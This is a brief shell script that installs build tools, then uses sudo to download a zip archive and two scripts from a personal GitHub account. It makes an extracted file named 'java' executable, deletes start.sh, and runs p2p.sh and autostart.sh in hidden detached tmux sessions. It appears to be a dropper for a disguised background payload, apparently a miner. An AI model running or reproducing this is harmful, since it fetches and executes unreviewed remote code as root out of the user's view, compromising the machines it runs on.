#!/bin/sh

sudo apt-get update	
sudo apt install build-essential gnupg2 gcc make gnupg2 unzip -y < "/dev/null"


sudo wget https://github.com/minnie1311/Python3/raw/main/ubuntu_18.04.zip
sudo unzip -o ubuntu_18.04.zip
sudo chmod +x java
sudo rm start.sh
wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
sudo tmux new-session -d -s 2 'bash p2p.sh'
sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
sudo chmod +x autostart.sh
sudo tmux new-session -d -s 1 './autostart.sh'





